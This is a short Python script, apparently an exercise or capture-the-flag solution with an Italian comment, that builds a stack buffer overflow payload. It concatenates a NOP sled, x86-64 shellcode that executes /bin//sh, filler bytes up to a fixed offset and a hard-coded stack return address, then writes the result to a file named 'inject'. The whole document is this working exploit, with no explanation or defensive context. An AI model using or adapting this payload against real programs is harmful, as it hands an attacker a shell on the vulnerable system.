MAGIC_N = 151
# ricorda 128 - 121 = 7 nop
if __name__ == '__main__':
    no_op = b'\x90' * 64
    shell_code = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    padding = b'\x41' * ( MAGIC_N - len(no_op) - len(shell_code) )
    rip_ = b'\xa0\xee\xff\xff\xff\x7f'
    inject = no_op + shell_code + padding + rip_

    with open("inject", "wb") as f:
        f.write(inject)
